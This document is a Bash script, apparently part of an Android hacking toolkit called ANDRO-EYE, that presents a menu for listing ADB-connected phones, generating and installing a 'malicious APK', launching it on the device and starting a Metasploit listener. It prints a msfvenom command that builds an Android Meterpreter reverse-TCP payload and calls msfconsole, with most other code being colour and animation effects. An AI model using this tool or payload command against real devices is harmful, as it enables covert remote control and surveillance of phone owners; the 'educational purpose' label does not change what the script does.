#!/bin/bash
# Written in Bash
# "ONLY FOR EDUCATIONAL PURPOSE"
# METASPLOIT SECTION - ANDRO-EYE

# Color codes
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
NC='\033[0m' # No Color
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Animation functions
loading_animation() {
    local message=$1
    local chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    
    echo -ne "${CYAN}${BOLD}$message ${NC}"
    for i in {1..20}; do
        for char in $(echo $chars | grep -o .); do
            echo -ne "${YELLOW}${BOLD}$char${NC}"
            sleep 0.05
            echo -ne "\b"
        done
    done
    echo -e "${GREEN}${BOLD} Done! ${NC}"
}

progress_bar() {
    local duration=$1
    local message=$2
    
    echo -ne "${BLUE}${BOLD}$message ${NC}"
    for i in {1..30}; do
        echo -ne "${GREEN}${BOLD}▓${NC}"
        sleep $(echo "scale=2; $duration/30" | bc 2>/dev/null || echo "0.05")
    done
    echo -e "${GREEN}${BOLD} Complete! ${NC}"
}

sparkle_effect() {
    echo -ne "${YELLOW}"
    for i in {1..20}; do
        echo -ne "✦"
        sleep 0.03
    done
    echo -e "${NC}"
}

pulse_message() {
    local message=$1
    local color=$2
    
    for i in {1..3}; do
        echo -ne "${color}${BOLD}$message${NC}"
        sleep 0.3
        echo -ne "\r"
        for j in $(seq 1 ${#message}); do
            echo -n " "
        done
        echo -ne "\r"
        sleep 0.3
    done
    echo -e "${color}${BOLD}$message${NC}"
}

typewriter_effect() {
    local text=$1
    local color=$2
    for ((i=0; i<${#text}; i++)); do
        echo -ne "${color}${BOLD}${text:$i:1}${NC}"
        sleep 0.03
    done
    echo
}

# Cleanup function
clean_exit() {
    echo -e "\n${YELLOW}${BOLD}🧹 Performing cleanup...${NC}"
    progress_bar 2 "Cleaning temporary files"
    
    rm -rf "$PWD/.temp/"* &> /dev/null
    rm -rf "$PWD/1" &> /dev/null
    rm -rf "$PWD/2" &> /dev/null
    
    echo -e "${GREEN}${BOLD}✓ Cleanup completed${NC}"
    sparkle_effect
    echo -e "${PURPLE}${BOLD}👋 Exiting Metasploit Section. Thanks for using!${NC}"
    echo -e "${GREEN}${BOLD}DONE${NC}\n"
    exit 0
}

# Trap Ctrl+C
trap_ctrlc() {
    clear
    pulse_message "⚠️  Ctrl-C caught! Performing Clean Up..." "${RED}"
    clean_exit
}

trap "trap_ctrlc" 2

# Enhanced banner with better ASCII art
banner2() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF"
    
███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   
██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                 
                                                                   
║              🔥 ${GREEN}METASPLOIT SECTION${RED} - ${CYAN}Payload Generator${RED}               
   
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}              DEVELOPED BY ${RED}${BOLD}A T H E X${NC}\n"
    sparkle_effect
}

# Function to check if Metasploit is installed
check_metasploit() {
    if command -v msfvenom &> /dev/null && command -v msfconsole &> /dev/null; then
        echo -e "${GREEN}${BOLD}✓ Metasploit Framework detected${NC}"
        return 0
    else
        echo -e "${RED}${BOLD}✗ Metasploit Framework not found!${NC}"
        echo -e "${YELLOW}Please install Metasploit first using the main installer${NC}"
        return 1
    fi
}

# Enhanced option menu with better formatting
option2_list() {
    banner2
    
    # Check Metasploit installation
    check_metasploit
    
    echo -e "\n\n${RED}${BOLD}${UNDERLINE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}${UNDERLINE}║         METASPLOIT PAYLOAD OPTIONS                      ║${NC}"
    echo -e "${RED}${BOLD}${UNDERLINE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${YELLOW}${BOLD}┌────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${GREEN}1.${NC}  ${CYAN}SHOW CONNECTED DEVICES${NC}                                 ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${GREEN}2.${NC}  ${PURPLE}CREATE AND INSTALL METASPLOIT PAYLOAD${NC}                    ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC}      ${WHITE}(Generate & install malicious APK)${NC}                         ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${GREEN}3.${NC}  ${BLUE}LAUNCH THE METASPLOIT PAYLOAD${NC}                           ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC}      ${WHITE}(Execute installed APK on device)${NC}                           ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${GREEN}4.${NC}  ${RED}LAUNCH METASPLOIT LISTENER${NC}                              ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC}      ${WHITE}(Start Metasploit console listener)${NC}                         ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${GREEN}5.${NC}  ${YELLOW}GO BACK TO ADB-TOOLKIT${NC}                                ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${RED}EXIT${NC} or Ctrl+C to quit                                           ${YELLOW}│${NC}"
    echo -e "${YELLOW}${BOLD}└────────────────────────────────────────────────────────┘${NC}\n"
    
    echo -ne "${RED}${BOLD}${BLINK}⚡${NC} ${UNDERLINE}SELECT OPTION${NC} ${RED}${BOLD}➤${NC} ${WHITE}"
    read options2
    echo -ne "${NC}"
}

# Initial setup
clear

# Check if running as root
if [ $(id -u) -ne 0 ]; then
    pulse_message "❌ THIS SCRIPT MUST BE RUN AS ROOT ❌" "${RED}"
    exit 1
fi

# Check if .temp directory exists
if [ ! -d "$PWD/.temp/" ]; then
    echo -e "${YELLOW}${BOLD}📁 Creating .temp directory...${NC}"
    mkdir -p "$PWD/.temp"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}${BOLD}✓ Created successfully${NC}"
    fi
fi

# Check if modules directory exists
if [ ! -d "$PWD/modules" ]; then
    echo -e "${RED}${BOLD}❌ Modules directory not found!${NC}"
    echo -e "${YELLOW}Please make sure you're in the correct ANDRO-EYE directory${NC}"
    exit 1
fi

# Welcome message
typewriter_effect "🚀 Initializing Metasploit Section..." "${PURPLE}"
sleep 1

revised=""
option2_list

## THE LOOP STARTS FROM HERE
while [ 1 ]; do
    case $options2 in
        "1")
            echo -e "\n${GREEN}${BOLD}📱 Showing connected devices...${NC}"
            if [ -f "modules/2opt1" ]; then
                bash modules/2opt1
            else
                echo -e "${RED}${BOLD}❌ Module 2opt1 not found!${NC}"
                adb devices
            fi
            ;;
            
        "2")
            echo -e "\n${PURPLE}${BOLD}📦 Creating Metasploit payload...${NC}"
            if [ -f "modules/2opt2" ]; then
                bash modules/2opt2
            else
                echo -e "${RED}${BOLD}❌ Module 2opt2 not found!${NC}"
                echo -e "${YELLOW}Please use msfvenom manually:${NC}"
                echo -e "${CYAN}msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o payload.apk${NC}"
            fi
            ;;
            
        "3")
            echo -e "\n${BLUE}${BOLD}🚀 Launching Metasploit payload...${NC}"
            if [ -f "modules/2opt3" ]; then
                bash modules/2opt3
            else
                echo -e "${RED}${BOLD}❌ Module 2opt3 not found!${NC}"
                echo -e "${YELLOW}Please install and launch payload manually${NC}"
            fi
            ;;
            
        "4")
            echo -e "\n${RED}${BOLD}🎧 Starting Metasploit listener...${NC}"
            if [ -f "modules/2opt4" ]; then
                bash modules/2opt4
            else
                echo -e "${RED}${BOLD}❌ Module 2opt4 not found!${NC}"
                echo -e "${YELLOW}Starting msfconsole manually...${NC}"
                echo -e "${CYAN}msfconsole -q${NC}"
                sleep 2
                msfconsole -q
            fi
            ;;
            
        "5")
            echo -e "\n${YELLOW}${BOLD}⬅️  Going back to ADB-Toolkit...${NC}"
            progress_bar 2 "Loading main menu"
            if [ -f "modules/funtion.sh" ]; then
                bash modules/funtion.sh
            else
                echo -e "${RED}${BOLD}❌ Main module not found!${NC}"
                echo -e "${YELLOW}Starting main script...${NC}"
                cd .. && bash ANDRO-EYE.sh 2>/dev/null || echo -e "${RED}Main script not found${NC}"
            fi
            break
            ;;
            
        "exit" | "EXIT" | "quit" | "QUIT" | "q" | "Q")
            clean_exit
            ;;
            
        *)
            clear
            pulse_message "❌ INVALID OPTION! Please try again ❌" "${RED}"
            revised="\n${RED}${BOLD}✗ Please enter a valid option (1-5) ✗${NC}\n"
            option2_list
            ;;
    esac
    
    # After executing option, ask to continue or exit
    if [ "$options2" != "5" ]; then
        echo -e "\n${YELLOW}${BOLD}════════════════════════════════════════════════════════${NC}"
        echo -ne "${GREEN}${BOLD}Press Enter to continue, 'm' for main menu, or 'q' to quit: ${NC}"
        read continue_choice
        
        case $continue_choice in
            "q" | "Q")
                clean_exit
                ;;
            "m" | "M")
                echo -e "\n${YELLOW}${BOLD}⬅️  Going back to main menu...${NC}"
                if [ -f "modules/funtion.sh" ]; then
                    bash modules/funtion.sh
                    break
                fi
                ;;
            *)
                clear
                option2_list
                ;;
        esac
    fi
done

#### END OF METASPLOIT SCRIPT ####